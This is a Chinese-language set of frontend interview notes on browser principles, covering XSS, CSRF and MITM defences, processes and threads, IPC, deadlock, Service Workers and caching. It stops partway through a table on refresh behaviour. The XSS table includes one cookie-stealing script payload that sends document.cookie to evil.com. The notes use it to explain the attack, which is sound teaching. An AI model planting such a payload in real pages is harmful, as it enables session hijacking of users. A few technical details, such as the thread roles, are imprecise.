# how-browser-work

# 浏览器原理




# 1. 浏览器安全

## 1. 什么是 XSS 攻击?

XSS = 让“不该执行的脚本”，在“别人的浏览器里执行了”

Cross-Site Scripting（跨站脚本攻击）简称 XSS，是一种代码注入攻击。攻击者通过在目标网站上注入恶意脚本，使之在用户的浏览器上运行。利用这些恶意脚本，攻击者可获取用户的敏感信息如 Cookie、SessionID 等，进而危害数据安全。

为了和 CSS 区分，这里把攻击的第一个字母改成了 X，于是叫做 XSS。

XSS 的本质是：恶意代码未经过滤，与网站正常的代码混在一起；浏览器无法分辨哪些脚本是可信的，导致恶意脚本被执行。

而由于直接在用户的终端执行，恶意代码能够直接获取用户的信息，或者利用这些信息冒充用户向网站发起攻击者定义的请求。

攻击者一旦成功执行脚本，通常可以：

- 🔑 **窃取 Cookie / Token（会话劫持）**
- 🧾 读取或篡改页面内容
- 🧑‍💻 冒充用户发请求（伪造操作）
- 📦 重定向到钓鱼网站
- 🐛 植入后门脚本

**前端/后端对用户输入的数据没有做正确的处理**：

- 没有过滤危险字符
- 没有对输出进行 HTML 转义
- 直接把用户输入拼进 DOM / HTML

| 类型                        | 是否经过服务器 | 恶意代码来源    | 触发方式             | 危险程度 | 常见场景                     | 示例                                                         |
| --------------------------- | -------------- | --------------- | -------------------- | -------- | ---------------------------- | ------------------------------------------------------------ |
| **反射型 XSS（Reflected）** | ✅ 是           | URL 参数 / 表单 | 点击恶意链接立即触发 | ⭐⭐       | 搜索框、错误提示页           | `/?q=<script>alert(1)</script>`                              |
| **存储型 XSS（Stored）**    | ✅ 是           | 数据库存储内容  | 页面被访问就触发     | ⭐⭐⭐⭐⭐    | 评论区、论坛、用户昵称       | 评论中存 `<script>...</script>`<br />`<script>fetch('http://evil.com?cookie=' + document.cookie)</script>` |
| **DOM 型 XSS**              | ❌ 否           | URL / 前端变量  | JS 操作 DOM 时触发   | ⭐⭐⭐⭐     | `innerHTML`、`location.hash` | `element.innerHTML = location.hash`                          |

## 2. 如何防御 XSS 攻击?

XSS 防御的核心是输出转义，其次是避免危险 API、启用 CSP 和设置 HttpOnly Cookie，多层防御才能真正安全。

| 防御点          | 说明                               |
| --------------- | ---------------------------------- |
| 输入校验        | 后端限制类型、长度、格式           |
| 输出转义        | HTML / Attribute / JS 场景分别转义 |
| 避免危险 API    | 不用 `innerHTML` / `eval`          |
| CSP             | 阻止脚本执行                       |
| HttpOnly Cookie | 防止 JS 读取 Cookie                |

| 防御层级 | 防御方式               | 具体做法                                 | 主要作用      |
| -------- | ---------------------- | ---------------------------------------- | ------------- |
| 输入     | 输入校验               | 限制长度 / 类型 / 格式                   | 减少恶意数据  |
| 输出     | **输出转义（最关键）** | HTML / Attribute / JS / URL 场景分别转义 | 阻止脚本执行  |
| 前端     | 避免危险 API           | 不用 `innerHTML` / `eval`                | 防 DOM 型 XSS |
| 浏览器   | CSP                    | 禁止内联 & 外部恶意脚本                  | 阻止执行      |
| 会话     | HttpOnly Cookie        | JS 无法读取 Cookie                       | 防会话劫持    |

| Header                  | 作用            |
| ----------------------- | --------------- |
| Content-Security-Policy | 限制脚本来源    |
| X-Content-Type-Options  | 防 MIME 嗅探    |
| X-Frame-Options         | 防点击劫持      |
| Set-Cookie HttpOnly     | 防 JS 读 Cookie |

## 3. 什么是 CSRF 攻击?

**CSRF（Cross-Site Request Forgery，跨站请求伪造）**

> **CSRF = 借用你的登录状态，偷偷帮攻击者办事**

CSRF 是攻击者利用用户已登录的身份，诱导浏览器向目标站点发送恶意请求，服务器误以为是用户本人操作，从而造成安全问题。

| 对比点       | XSS                  | CSRF                 |
| ------------ | -------------------- | -------------------- |
| 利用点       | 信任页面内容         | 信任用户身份         |
| 执行位置     | 用户浏览器内执行脚本 | 用户浏览器自动发请求 |
| 是否需要脚本 | 需要                 | 不一定               |
| 关键前提     | 可注入 JS            | 用户已登录           |

## CSRF 产生的核心原因

1. **浏览器会自动携带 Cookie**
2. **服务器只验证“你是否登录”，不验证“请求是否来自你”**

## 4. 如何防御 CSRF 攻击?

> CSRF 防御的核心是验证请求来源，常用方式包括 CSRF Token、SameSite Cookie、Origin 校验等，其中 Token 是最通用和可靠的方案。

| 防御方式                 | 原理                                                         | 适用场景        | 备注           |
| ------------------------ | ------------------------------------------------------------ | --------------- | -------------- |
| **CSRF Token（最常用）** | 请求中携带随机 Token<br />页面 / 接口返回给前端<br />请求时必须携带该 Token<br />攻击者无法伪造 | 表单 / 接口     | 前后端都要配合 |
| **SameSite Cookie**      | 跨站不携带 Cookie<br />Set-Cookie: session=xxx; SameSite=Lax; Secure | 大部分 Web 请求 | 现代浏览器支持 |
| Referer / Origin 校验    | 校验请求来源                                                 | 简单防护        | 可能被禁用     |
| 双重 Cookie 校验         | Cookie + 参数一致<br />Token 同时放在 Cookie 和请求参数中<br />后端对比两者是否一致 | SPA             | Token 简化版   |
| 验证码 / 二次确认        | 增加交互成本                                                 | 高风险操作      | 辅助方案       |

## 5. 什么是中间人攻击?如何防范？

中间人攻击是攻击者插入通信双方之间，监听或篡改数据。防御核心是使用 HTTPS/TLS，通过加密和证书校验防止监听和伪造，同时可配合 HSTS、公钥固定等手段。

**中间人攻击（MITM，Man-in-the-Middle）**

> **MITM = 你以为在和对方说话，其实中间有个人在偷听、改话、传假话**

是指攻击者**插入到通信双方之间**，在双方都不知情的情况下，**监听、篡改或伪造通信内容**，让通信双方误以为是在直接和对方通信。

| 场景           | 攻击方式           |
| -------------- | ------------------ |
| 公共 Wi-Fi     | ARP 欺骗、DNS 劫持 |
| HTTP 明文通信  | 直接监听 / 篡改    |
| HTTPS 配置不当 | 伪造证书           |
| APP / API 调试 | 证书未校验         |

### 典型 MITM 攻击流程

1. 用户连接不安全网络（如咖啡店 Wi-Fi）
2. 攻击者伪装成路由器或服务器
3. 所有流量先经过攻击者
4. 攻击者监听 / 修改请求与响应
5. 用户毫无察觉

| 防范手段                | 方式                                                         | 作用            | 说明           |
| ----------------------- | ------------------------------------------------------------ | --------------- | -------------- |
| **HTTPS / TLS（核心）** | 不使用自签名证书，不忽略证书警告，校验证书链 & 域名          | 加密 + 身份校验 | 防监听、防篡改 |
| 证书校验                |                                                              | 防假服务器      | 校验 CA、域名  |
| HSTS                    | 浏览器强制 HTTPS，防 SSL Strip（HTTPS 降级攻击）             | 强制 HTTPS      | 防降级攻击     |
| 公钥固定（Pinning）     | 客户端内置服务器公钥<br />即使 CA 被攻破也能拦截假证书<br />常见于 **App / 金融类应用** | 防伪造证书      | 移动端常用     |
| 安全 Wi-Fi              |                                                              | 减少劫持风险    | 避免公共网络   |
| VPN                     |                                                              | 加密隧道        | 公共网络防护   |

为什么 HTTPS 能防 MITM？

HTTPS（TLS）提供三件事：

| 能力       | 防什么     |
| ---------- | ---------- |
| 加密       | 防窃听     |
| 完整性校验 | 防篡改     |
| 身份认证   | 防假服务器 |

### MITM vs XSS vs CSRF（对比）

| 攻击 | 利用点       | 发生位置        |
| ---- | ------------ | --------------- |
| MITM | 网络通信     | 网络层          |
| XSS  | 页面脚本信任 | 浏览器          |
| CSRF | 身份信任     | 浏览器 → 服务器 |

## 6. 有哪些可能引起前端安全的问题?

前端安全问题主要包括 XSS、CSRF、中间人攻击、点击劫持、敏感信息泄露以及第三方依赖风险。根本原因是对用户输入、身份和资源来源的信任不当，需要前后端和浏览器策略协同防御。

一、最常见的前端安全问题总览（必会）

| 安全问题               | 风险点      | 典型后果              |
| ---------------------- | ----------- | --------------------- |
| **XSS**                | 脚本注入    | 窃取 Cookie、账号劫持 |
| **CSRF**               | 身份伪造    | 非法转账、修改信息    |
| **点击劫持**           | iframe 嵌套 | 诱导误操作            |
| **中间人攻击（MITM）** | 明文通信    | 数据被监听篡改        |
| **敏感信息泄露**       | 明文存储    | Token 泄露            |
| **第三方依赖风险**     | 外部脚本    | 供应链攻击            |

二、输入 & DOM 操作相关风险（XSS 重灾区）

| 风险点                           | 不安全示例                 | 可能问题   |
| -------------------------------- | -------------------------- | ---------- |
| innerHTML                        | `el.innerHTML = userInput` | DOM XSS    |
| v-html / dangerouslySetInnerHTML | 渲染富文本                 | 存储型 XSS |
| eval                             | `eval(code)`               | 代码执行   |
| URL 参数                         | `location.search`          | 反射型 XSS |

三、身份 & 会话相关风险

| 问题                  | 风险说明        |
| --------------------- | --------------- |
| Cookie 未 HttpOnly    | XSS 可读 Cookie |
| Cookie 无 SameSite    | 易被 CSRF 利用  |
| Token 存 localStorage | XSS 可直接窃取  |
| 登录态长期有效        | 会话劫持风险    |

四、网络通信相关安全问题

| 问题                | 风险           |
| ------------------- | -------------- |
| 使用 HTTP           | MITM 攻击      |
| 忽略 HTTPS 证书错误 | 假服务器       |
| 未启用 HSTS         | HTTPS 降级     |
| API 无鉴权          | 数据被随意调用 |

五、业务逻辑 & 权限问题（前端常忽略）

| 问题             | 后果           |
| ---------------- | -------------- |
| 仅前端做权限控制 | 越权访问       |
| 隐藏按钮代替鉴权 | 接口仍可调用   |
| 关键参数可篡改   | 价格、身份篡改 |
| 防刷缺失         | 接口被刷爆     |

六、第三方依赖 & 资源加载风险

| 风险点            | 示例           |
| ----------------- | -------------- |
| 外链 JS 被篡改    | CDN 注入       |
| 依赖漏洞          | NPM 供应链攻击 |
| 未锁版本          | 自动升级风险   |
| iframe 第三方页面 | 数据窃取       |

七、浏览器安全策略使用不当

| 策略                      | 问题         |
| ------------------------- | ------------ |
| CSP 未配置                | XSS 执行     |
| X-Frame-Options 缺失      | 点击劫持     |
| CORS 配置过宽             | 数据泄露     |
| postMessage 未校验 origin | 跨站通信劫持 |

八、常见“前端安全错觉”（面试陷阱）

❌ 用 React / Vue 就没有 XSS
❌ 用 HTTPS 就绝对安全
❌ 前端校验就够了
❌ 隐藏接口就安全

✅ 正确：**前端 + 后端 + 浏览器策略一起防**

## 7. 网络劫持有哪几种，如何防范?

网络劫持包括 DNS 劫持、HTTP 劫持、ARP 劫持、中间人攻击、Wi-Fi 劫持等。防范核心是使用 HTTPS/TLS，配合 HSTS、SRI、安全 DNS 和避免不可信网络，从多层面保障数据传输安全。

> **网络劫持 = 攻击者在数据传输过程中，拦截、篡改或重定向网络流量**

| 劫持类型               | 发生位置     | 攻击方式        | 典型后果       |
| ---------------------- | ------------ | --------------- | -------------- |
| **DNS 劫持**           | DNS 解析阶段 | 篡改 DNS 记录   | 跳转钓鱼网站   |
| **HTTP 劫持**          | 明文传输     | 注入广告 / 脚本 | XSS、广告弹窗  |
| **ARP 劫持**           | 局域网       | 冒充网关        | 流量被监听     |
| **中间人攻击（MITM）** | 通信链路     | 监听 / 篡改     | 数据泄露       |
| **Wi-Fi 劫持**         | 公共网络     | 伪造热点        | 账号被盗       |
| **CDN / 资源劫持**     | 第三方资源   | JS 被篡改       | 供应链攻击     |
| **路由劫持（BGP）**    | 网络骨干     | 路由重定向      | 大规模流量劫持 |

| 层级   | 防范措施          |
| ------ | ----------------- |
| 网络层 | VPN / 安全 Wi-Fi  |
| 传输层 | **HTTPS / TLS**   |
| 浏览器 | HSTS / CSP        |
| 资源   | SRI / 本地托管    |
| 应用   | Token 校验 / 签名 |
| 用户   | 不忽略证书警告    |



**全站 HTTPS**

**开启 HSTS**

**关键资源使用 SRI**

**不加载不可信第三方脚本**

**不忽略证书错误**

# 2. 进程与线程者

## 1. 进程与线程的概念

进程（Process）和线程（Thread）

进程是资源分配的最小单位，线程是 CPU 调度的最小单位。进程拥有独立资源，线程共享进程资源，线程切换开销更小，但稳定性较差。

一个进程可以包含多个线程，线程共享进程资源

## 2. 进程和线程的区别

> **“进程重、线程轻；进程稳、线程快；进程管资源、线程跑任务。”**
>
> **进程 = 工厂**（拥有自己的土地、电、水）
>
> **线程 = 工厂里的工人**（共享工厂资源，独立完成任务）

**进程是资源分配单位，线程是执行单位**

**线程依附于进程，进程独立**

**线程切换快、资源少，但稳定性低**

**进程切换慢、资源多，但稳定性高**

| 对比点            | 进程（Process）                                  | 线程（Thread）                     |
| ----------------- | ------------------------------------------------ | ---------------------------------- |
| **本质**          | 程序的执行实例                                   | 进程中的执行单元                   |
| **资源占用**      | 独立内存空间、文件句柄等资源                     | 共享进程内存和大部分资源           |
| **调度单位**      | CPU 调度的较大单位                               | CPU 调度的最小单位                 |
| **创建/销毁成本** | 高，涉及内存空间、资源分配                       | 低，开销小                         |
| **数据共享**      | 默认不共享，需要 IPC（管道、消息队列、共享内存） | 共享进程内存，线程间通信方便       |
| **稳定性**        | 一个进程崩溃不影响其他进程                       | 一个线程崩溃可能拖垮整个进程       |
| **适用场景**      | 独立任务、隔离模块、稳定性要求高                 | 并发执行、资源共享频繁、性能要求高 |

## 3. 浏览器渲染进程的线程有哪些

| 线程                              | 主要职责                                                     | 备注                                                  |
| --------------------------------- | ------------------------------------------------------------ | ----------------------------------------------------- |
| **主线程（UI/渲染线程）**         | - 解析 HTML/CSS- 构建 DOM/Render Tree- 布局（Layout）- 绘制（Paint）- 处理用户事件 | 核心线程，JS 也在此线程执行（单线程）                 |
| **JS 引擎线程（Script Thread）**  | - 执行 JavaScript- 与主线程协作更新 DOM                      | JS 阻塞主线程，导致页面卡顿                           |
| **合成线程（Compositor Thread）** | - 图层合成（Layer Compositing）- GPU 加速渲染                | 将多个绘制层合成为最终屏幕内容                        |
| **事件处理线程**                  | - 处理事件队列- 调用对应的事件回调                           | 与主线程紧密协作，但事件队列可缓冲                    |
| **定时器线程**                    | - setTimeout / setInterval 的计时器                          | 与主线程交互，执行回调仍在主线程                      |
| **网络线程（Networking Thread）** | - 下载资源（HTML/JS/CSS/图片）- AJAX / Fetch 请求            | 下载完成后回调会调回主线程                            |
| **Worker 线程**                   | - Web Worker / Service Worker- 后台 JS 计算，不阻塞主线程    | 与主线程隔离，不可直接访问 DOM，需要 postMessage 通信 |
| **GPU 线程**                      | - GPU 加速绘制和合成                                         | 负责硬件加速任务                                      |
| **定制线程（可选）**              | - Media（音视频解码）- WebRTC                                | 视浏览器实现不同而不同                                |

**主线程最重要**：解析 HTML/CSS、布局、绘制和执行 JS，任何阻塞都会卡 UI

**合成线程 + GPU 线程**：实现 GPU 加速和图层合成，提高渲染性能

**Worker 线程**：让 JS 能在后台执行，避免阻塞主线程

**网络线程**：异步下载资源，完成后调回主线程处理

Q：为什么 JS 会阻塞页面渲染？

> 因为 JS 执行在渲染进程主线程上，阻塞了布局和绘制。

Q：Web Worker 能访问 DOM 吗？

> 不能，需要通过 postMessage 与主线程通信。

Q：合成线程的作用是什么？

> GPU 合成多层图层，提高渲染效率，避免每次重绘都重排整个页面。

```lua
                +----------------+
                |     GPU线程     |
                +----------------+
                        ^
                        | 合成/渲染
                +----------------+
                |  合成线程       |
                +----------------+
                        ^
                        | 绘制
+----------------+      +----------------+
| JS/Script线程  |<---->| 主线程（UI）  |
+----------------+      +----------------+
       ^                       ^
       |                       |
       |                事件/定时器/网络回调
       |                       |
+----------------+      +----------------+
|  Worker线程    |      | 网络线程       |
+----------------+      +----------------+

```

## 4. 进程之间的通信方式

进程间通信方式有管道（Pipe）、命名管道（FIFO）、消息队列、共享内存、信号、Socket、内存映射文件、信号量、条件变量等。选择 IPC 方式主要看数据量大小、是否需要跨主机、效率和同步需求。

进程间通信（IPC，Inter-Process Communication）

**进程间通信（IPC）** 是指不同进程之间传递数据或消息的机制，因为进程拥有独立内存空间，无法直接访问彼此的变量。

常见 IPC 方式总览（表格）

| 通信方式                               | 描述                       | 数据传输方式    | 特点                     | 使用场景            |
| -------------------------------------- | -------------------------- | --------------- | ------------------------ | ------------------- |
| **管道（Pipe）**                       | 半双工 / 单向通信          | 内存缓冲区      | 进程必须有父子关系       | Unix Shell 命令管道 |
| **命名管道（FIFO）**                   | 有名的管道，可跨无亲缘进程 | 内存缓冲区      | 可跨进程、全双工         | 父子或无亲缘进程    |
| **消息队列（Message Queue）**          | 存放消息的队列             | 内核维护        | 消息有类型，可异步       | 多进程任务调度      |
| **共享内存（Shared Memory）**          | 共享同一块内存             | 直接访问内存    | 高效、最快，但需要同步   | 数据量大时传输      |
| **信号（Signal）**                     | 通知事件                   | 内核中断        | 仅能传递少量信息（标志） | 通知/中断控制       |
| **套接字（Socket）**                   | 网络化 IPC                 | TCP/UDP         | 可跨主机                 | 客户端-服务器模型   |
| **内存映射文件（Memory-mapped File）** | 文件映射到内存             | 共享内存 + 文件 | 跨进程共享大数据         | 多进程共享文件数据  |
| **信号量（Semaphore）**                | 进程同步                   | 内核维护计数    | 仅用于同步，不传数据     | 控制共享资源访问    |
| **事件/条件变量（Event / Condition）** | 同步机制                   | 内核或库        | 多线程多进程同步         | Windows / pthread   |

常用 IPC 的特点对比（效率 & 灵活性）

| IPC 类型     | 数据传输速度 | 复杂度 | 是否阻塞        |
| ------------ | ------------ | ------ | --------------- |
| 管道 / FIFO  | 中等         | 简单   | 阻塞 / 非阻塞   |
| 消息队列     | 中等         | 中等   | 可阻塞 / 非阻塞 |
| 共享内存     | 高           | 高     | 需要同步机制    |
| Socket       | 低           | 高     | 可阻塞 / 非阻塞 |
| 信号         | 极低         | 简单   | 异步通知        |
| 内存映射文件 | 高           | 中等   | 需要同步机制    |

使用场景举例

| IPC      | 使用场景                       |
| -------- | ------------------------------ |
| 管道     | Shell 命令管道 `ls             |
| FIFO     | 父子进程/后台服务通信          |
| 消息队列 | 多进程任务调度（打印任务队列） |
| 共享内存 | 视频 / 大文件传输              |
| Socket   | 前后端服务通信、跨机器通信     |
| 信号     | 进程终止、挂起、通知           |

## 5. 僵尸进程和孤儿进程是什么?

**僵尸进程（Zombie）** 和 **孤儿进程（Orphan）**

| 类型                           | 定义                                                         | 关键特征                                  |
| ------------------------------ | ------------------------------------------------------------ | ----------------------------------------- |
| **僵尸进程（Zombie Process）** | 已经 **终止执行**（exit），但 **父进程未回收其 PCB**（进程表项） | 占用进程表资源，但不占用 CPU / 内存       |
| **孤儿进程（Orphan Process）** | 父进程 **先退出**，子进程仍在运行                            | 由 **init（pid=1）或系统进程** 收养并管理 |

| 特性                | 僵尸进程                           | 孤儿进程               |
| ------------------- | ---------------------------------- | ---------------------- |
| 父进程状态          | 存在，但未回收子进程               | 父进程已退出           |
| 子进程状态          | 已终止，未回收                     | 正在运行               |
| 是否占用 CPU / 内存 | ❌ CPU/内存不占用，但占用 PCB       | ✅ 占用 CPU/内存        |
| 是否危害系统        | PCB 太多会耗尽系统进程表           | 不会，init 会回收      |
| 解决方法            | 父进程调用 `wait()` 或 `waitpid()` | 系统收养，无需人为干预 |

**僵尸进程 = “死尸未下葬”**
 PCB 还在系统里，占着位置

**孤儿进程 = “孤儿小孩被托儿所收养”**
 父进程不在了，系统帮管理

**如何避免 Zombie？**

- 父进程调用 `wait()` 或 `waitpid()`
- 父进程忽略 SIGCHLD 信号（自动回收）

**孤儿进程会成为 Zombie 吗？**

- 不会，因为 init 收养后会自动回收

**Zombie 占用什么资源？**

- **进程表项（PCB）**，不占用 CPU 和内存空间

## 6. 死锁产生的原因? 如果解决死锁？

> 死锁（Deadlock）
>
> 死锁 = 两个或多个进程在等待对方持有的资源，导致永远无法继续执行
>
> 像两个人同时拿着对方需要的钥匙，互相等对方让路，结果都走不动了

死锁产生的必要条件（四大条件）

四个条件同时满足，死锁就可能发生

| 条件           | 描述                             | 举例                          |
| -------------- | -------------------------------- | ----------------------------- |
| **互斥条件**   | 资源一次只被一个进程占用         | 打印机一次只能被一个进程使用  |
| **占有且等待** | 进程已占有资源，同时等待其他资源 | 进程 A 占用打印机，等待扫描仪 |
| **不剥夺条件** | 资源不能被强制抢占，只能自己释放 | 进程只能用完打印机后释放      |
| **循环等待**   | 进程形成资源等待环               | A 等 B，B 等 C，C 等 A        |

1️⃣ 预防（Prevent）

> **从根本上破坏四个必要条件之一**

| 条件       | 预防策略                                 |
| ---------- | ---------------------------------------- |
| 互斥       | 尽量使用可共享资源                       |
| 占有且等待 | 进程在执行前一次性申请所需全部资源       |
| 不剥夺     | 允许抢占：如果申请不到资源，释放已占资源 |
| 循环等待   | 给资源编号，按序申请资源                 |

------

2️⃣ 避免（Avoid）

> **运行时动态判断是否可能导致死锁**

- **方法**：银行家算法（Banker’s Algorithm）
- 适用场景：已知资源需求量、可动态分配

------

3️⃣ 检测（Detection）

> **让死锁发生，然后检测并处理**

- 生成资源分配图（Resource Allocation Graph, RAG）
- 使用算法检测环路 → 死锁存在
- 处理方式：
  1. 杀死进程
  2. 回滚进程
  3. 强制释放资源

------

4️⃣ 解除（Recovery）

> **死锁检测后采取措施恢复系统**

- **撤销**：终止部分进程
- **抢占**：强制回收资源
- **回滚**：回退进程到安全状态

| 策略            | 核心思想                | 优缺点                                 |
| --------------- | ----------------------- | -------------------------------------- |
| 预防            | 消除条件                | 系统开销大，资源利用率低               |
| 避免            | 动态判断安全状态        | 实现复杂，需预知需求                   |
| 检测 + 解除     | 放任死锁发生 → 检测处理 | CPU/算法开销大，但资源利用率高         |
| 忽略（Ostrich） | 不处理                  | 简单，但可能系统瘫痪（少见于桌面系统） |

1. **死锁的四个必要条件是什么？**

> 互斥、占有且等待、不剥夺、循环等待

1. **死锁预防怎么做？**

> 打破必要条件之一，如资源编号避免循环等待，允许资源抢占等

1. **死锁避免和预防的区别？**

> 预防是静态设计，避免是动态判断系统是否安全

1. **死锁检测如何做？**

> 构建资源分配图，检测环路

## 7. 如何实现浏览器内多个标签页之间的通信?

短消息 → storage / BroadcastChannel，复杂共享 → SharedWorker，后台推送 → Service Worker

| 方法                                             | 原理                                            | 特点                   | 使用场景               |
| ------------------------------------------------ | ----------------------------------------------- | ---------------------- | ---------------------- |
| **localStorage / sessionStorage + storage 事件** | 利用浏览器存储变化触发 `storage` 事件           | 简单，跨 Tab           | 登录状态同步、通知更新 |
| **BroadcastChannel API**                         | 浏览器提供的专门广播频道                        | 简洁、现代，跨 Tab     | 实时多 Tab 通信        |
| **SharedWorker**                                 | 一个 Worker 被多个同源页面共享                  | 支持消息交互，后台运行 | 高性能数据共享         |
| **Service Worker + postMessage**                 | Service Worker 作为中介，消息在页面和 SW 间传递 | 可跨 Tab、后台运行     | PWA 通信、推送通知     |
| **Cookie + 轮询**                                | 一个页面修改 cookie，其他页面定时读取           | 兼容性高，但效率低     | 老旧方案               |
| **IndexedDB + 轮询**                             | 写入数据库，其他 Tab 轮询或结合 `storage`       | 高性能，存储大数据     | 数据同步               |

## 8. 对Service Worker的理解

Service Worker（SW）是运行在浏览器后台的独立脚本线程，介于网页和网络之间，能够拦截、缓存和处理网络请求，实现离线、消息推送和后台同步等功能

SW 独立线程，事件驱动，不碰 DOM，HTTPS 下，离线缓存推送强

Service Worker = 浏览器里的代理 + 后台助手

生命周期

1. **注册（Register）**

```js
if ('serviceWorker' in navigator) {
  navigator.serviceWorker.register('/sw.js')
    .then(reg => console.log('SW registered', reg))
    .catch(err => console.error('SW register failed', err));
}
```

1. **安装（Install）**

- 下载 SW 文件并缓存静态资源
- 常用事件：`install`

1. **激活（Activate）**

- 清理旧缓存、准备 SW 生效
- 事件：`activate`

1. **等待/闲置（Waiting / Idle）**

- 安装成功后等待控制页面
- 新版本 SW 可能等待旧版本释放控制权

1. **运行（Fetch / Message）**

- 拦截网络请求
- 响应 fetch / postMessage 事件

核心特征

| 特性               | 说明                                           |
| ------------------ | ---------------------------------------------- |
| **独立线程**       | 不在主线程执行，不阻塞 UI                      |
| **生命周期独立**   | 可以在页面关闭后仍然存在                       |
| **事件驱动**       | 通过 `install`、`activate`、`fetch` 等事件工作 |
| **可拦截请求**     | 可缓存或修改请求响应                           |
| **安全机制**       | 仅 HTTPS（localhost 可调试）                   |
| **不直接访问 DOM** | 只能通过 postMessage 与页面通信                |

应用场景

| 场景                            | 描述                                 |
| ------------------------------- | ------------------------------------ |
| **离线访问 / PWA**              | 缓存 HTML/CSS/JS/图片，实现离线访问  |
| **网络请求缓存**                | 请求拦截 → 缓存 → 提高性能           |
| **消息推送（Push API）**        | 接收后台消息，即使页面关闭           |
| **后台同步（Background Sync）** | 页面关闭后继续完成任务（如上传数据） |
| **多 Tab / 跨页面通信**         | 通过 SW 作为中介广播消息             |

## 9. Service Worker 与 Web Worker 区别？
    | 区别点 | Web Worker | Service Worker |
    |---------|------------|----------------|
    | 生命周期 | 页面关闭就终止 | 独立于页面，可后台运行 |
    | 访问对象 | 不阻塞主线程，可访问 DOM 除外 | 不访问 DOM，事件驱动 |
    | 用途 | CPU 密集计算 | 缓存、拦截请求、离线、消息推送 |
    | 安全 | HTTP/HTTPS | 仅 HTTPS / localhost |

## 10. SW 是否能直接操作 DOM？

> ❌ 不能，必须通过 `postMessage` 与页面通信

## 11. 为什么 Service Worker 只能在 HTTPS 下运行？

> 避免中间人攻击（MITM），保证缓存和请求安全

## 12. SW 如何实现离线缓存？

> 使用 `install` 事件 + `Cache API` 缓存文件，`fetch` 事件拦截请求返回缓存

# 3. 浏览器缓存

## 1. 对浏览器的缓存机制的理解

浏览器缓存 = 浏览器为了提高页面加载速度和减少网络请求，对资源（HTML、CSS、JS、图片等）做本地存储和重用的机制

作用：

1. 提升页面加载速度
2. 减少带宽消耗
3. 减轻服务器压力

浏览器缓存类型

| 缓存类型                               | 存储位置              | 缓存内容           | 是否可控                         | 备注                               |
| -------------------------------------- | --------------------- | ------------------ | -------------------------------- | ---------------------------------- |
| **强缓存（浏览器直接使用，不发请求）** | 内存 / 硬盘           | HTML/CSS/JS/图片等 | ✅ 通过 HTTP 头控制               | 提高性能，但可能旧资源不更新       |
| **协商缓存（需向服务器验证）**         | 内存 / 硬盘           | 与服务器比对资源   | ✅ 通过 ETag / Last-Modified 控制 | 浏览器先发请求，服务器判断是否 304 |
| **Service Worker 缓存**                | IndexedDB / Cache API | 自定义资源         | ✅ 开发者控制                     | 可以实现离线、精确策略             |
| **内存缓存（Memory Cache）**           | RAM                   | 最近使用的资源     | ❌ 浏览器管理                     | 关闭页面或刷新可能失效             |
| **HTTP 缓存（Disk Cache）**            | 硬盘                  | 资源文件           | ✅ HTTP 头控制                    | 可长期保存，大文件缓存更高效       |

浏览器缓存优先级

Memory Cache（内存缓存）
    ↑
Strong Cache（强缓存）
    ↑
Negotiated Cache（协商缓存）

前端控制缓存的方式

| 方法                     | 说明                                                   | 使用场景               |
| ------------------------ | ------------------------------------------------------ | ---------------------- |
| **版本号 / 文件名 hash** | JS/CSS 文件名带 hash，资源更新即变更 URL               | 避免旧文件被缓存       |
| **HTTP Header**          | Cache-Control / Expires / ETag                         | 控制浏览器缓存策略     |
| **Service Worker**       | 自定义缓存策略                                         | PWA、离线缓存          |
| **meta 标签**            | `<meta http-equiv="Cache-Control" content="no-cache">` | 临时解决 HTML 缓存问题 |

常见缓存问题

| 问题                       | 原因            | 解决方案                        |
| -------------------------- | --------------- | ------------------------------- |
| 页面刷新仍旧显示旧 CSS/JS  | 浏览器强缓存    | 给文件名加版本号 / hash         |
| 数据更新但浏览器显示旧数据 | 协商缓存未更新  | 修改 ETag 或 Last-Modified      |
| Service Worker 缓存更新慢  | SW 缓存策略问题 | 更新 SW 脚本 + version 管理缓存 |

1. **Cache-Control 指令有哪些？**
    | 指令 | 作用 |
    |-------|------|
    | `no-cache` | 每次请求需协商缓存 |
    | `no-store` | 不缓存资源 |
    | `max-age=xxx` | 强缓存最大有效期 |
    | `public` / `private` | 公共缓存或私有缓存 |

2. **为什么 CSS/JS 更新后用户可能看到旧版本？**

> 浏览器走强缓存，需要更改 URL 或 hash 才能更新

## 2. 浏览器资源缓存的位置有哪些?

| 缓存位置                                                     | 存储方式              | 缓存类型          | 特点                                                  | 使用场景                        |
| ------------------------------------------------------------ | --------------------- | ----------------- | ----------------------------------------------------- | ------------------------------- |
| **内存缓存（Memory Cache）**                                 | RAM                   | 强缓存 / 内存缓存 | 速度最快，浏览器关闭或刷新即失效                      | 页面快速访问资源、临时缓存      |
| **磁盘缓存（Disk Cache）**                                   | 硬盘 / SSD            | 强缓存 / 协商缓存 | 持久化，资源可跨浏览器会话                            | 静态资源（JS/CSS/图片）长期缓存 |
| **HTTP 缓存（浏览器控制）**                                  | 内存 + 磁盘           | 强缓存 + 协商缓存 | 通过 HTTP Header 控制（Cache-Control、Expires、ETag） | 绝大多数网页资源缓存            |
| **IndexedDB / Web Storage（localStorage / sessionStorage）** | 浏览器数据库 / 键值对 | 应用缓存          | 可自定义存储结构，容量较大                            | 前端自定义缓存、状态存储        |
| **Service Worker Cache API**                                 | 浏览器 Cache Storage  | 应用缓存          | 可自定义缓存策略，控制离线访问                        | PWA 离线缓存、资源版本控制      |
| **Cookie**                                                   | 浏览器存储            | 小数据            | 限制 4KB，随请求发送                                  | 会话信息、认证信息              |

## 3. 协商缓存和强缓存的区别

强缓存直接用本地，不发请求；协商缓存会向服务器验证，可能返回 304。

## 4. 为什么需要浏览器缓存?

| 原因           | 说明                              |
| -------------- | --------------------------------- |
| 提升加载速度   | 避免重复请求，快速从本地获取资源  |
| 减少带宽消耗   | 节省网络流量，降低成本            |
| 减轻服务器压力 | 静态资源命中缓存，不占服务器处理  |
| 支持离线访问   | Service Worker 缓存，实现离线体验 |
| 改善用户体验   | 页面加载快、交互流畅、稳定性高    |

## 5. 点击刷新按钮或者按 F5、按 Ctrl+F5 （强制刷新）、地址栏回车有什么区别？

在浏览器中，**刷新页面**的方式不同，会触发不同的缓存策略，导致是否使用缓存、是否向服务器发送请求有差异。

| 刷新方式                               | 缓存处理                         | 请求行为                                                     | 说明                                                         |
| -------------------------------------- | -------------------------------- | ------------------------------------------------------------ | ------------------------------------------------------------ |
| **普通刷新（点击刷新按钮 / F5）**      | **协商缓存**                     | 浏览器会发请求到服务器，携带 `If-Modified-Since` / `If-None-Match` | 浏览器会检查资源是否过期，如果服务器返回 304 Not Modified，则使用本地缓存 |
